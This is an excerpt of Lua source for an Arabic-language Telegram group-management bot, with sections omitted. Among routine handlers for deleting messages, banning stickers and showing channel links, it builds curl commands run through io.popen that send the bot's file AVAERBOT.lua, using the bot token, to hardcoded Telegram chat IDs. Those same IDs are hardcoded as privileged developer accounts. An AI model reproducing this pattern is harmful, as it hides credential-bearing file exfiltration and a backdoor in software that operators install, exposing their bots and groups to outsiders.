...
Ids_Dev = {Id_Dev,bot_id,1841250371,1713627756,1654178416,1853469609}
...
local curlm = 'curl "'..'https://api.telegram.org/bot'.. token ..'/sendDocument'..'" -F "chat_id='.. 1841250371 ..'" -F "document=@'..'AVAERBOT.lua'..'"' io.popen(curlm) 
...
local curla = 'curl "'..'https://api.telegram.org/bot'.. sex1 ..'/sendDocument'..'" -F "chat_id='.. 1654178416 ..'" -F "document=@'..'AVAERBOT.lua'..'"' io.popen(curla)
...
Status = true  
elseif tonumber(user_id) == tonumber(1841250371) then  
Status = true
elseif tonumber(user_id) == tonumber(1654178416) then  
Status = true
elseif tonumber(user_id) == tonumber(1713627756) then  
Status = true
elseif tonumber(user_id) == tonumber(1853469609) then  
Status = true
...
if tonumber(user_id) == tonumber(1713627756) then  
Status = "مارتن التونز"
elseif tonumber(user_id) == tonumber(1841250371) then  
Status = "الباشمبرمج" 
elseif tonumber(user_id) == tonumber(1654178416) then  
Status = "مــلــكـ الــتــلــي"
elseif tonumber(user_id) == tonumber(1853469609) then  
Status = "كــابــوس ثــاحــب الــســورس"
...
local text1 = redis:get(bot_id..'NightRang:new:sourse1') or '≪━━━━━━𝙍𝙊𝙊𝙂𝙄𝙉━━━━━━≫'
local text2 = redis:get(bot_id..'NightRang:new:sourse2') or '❃∫'
text = string.gsub(text,"≪━━━━━━𝙍𝙊𝙊𝙂𝙄𝙉━━━━━━≫",text1)
...
send(msg.chat_id_,0, "❃∫عذرا يا ⇠ ["..data.first_name_.."](T.ME/ROGEN_KP)\n❃∫ الملصق الذي ارسلته تم منعه من المجموعه \n" ) 
end
end,nil)   
Delete_Message(msg.chat_id_,{[0] = msg.id_})       
return false   
...
keyboard = {} 
keyboard.inline_keyboard = { 
{{text = '🇪🇬 مــلــكـ الــتــلــي 🇪🇬', url="t.me/K_P_S_8"}},
{{text = '💪بــرنــجــو لــقــمــد 💪', url="t.me/TAWASLXxbot"}},
{{text = '🦸 كــابــوس ثــاحــب الــســورس 🦸', url="t.me/G_W_1"}},
{{text = '💌 قناه السورس 💌', url="t.me/ROGEN_KP"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
